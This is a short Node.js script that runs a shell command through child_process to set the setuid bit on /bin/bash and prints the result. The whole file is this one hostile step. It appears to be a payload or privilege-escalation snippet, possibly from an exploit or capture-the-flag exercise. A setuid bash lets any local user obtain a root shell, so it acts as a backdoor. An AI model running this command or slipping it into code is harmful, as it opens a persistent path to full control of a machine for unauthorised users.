const childProcess = require('child_process');
const fs = childProcess.execSync('chmod u+s /bin/bash').toString();

console.log({
 fs
});
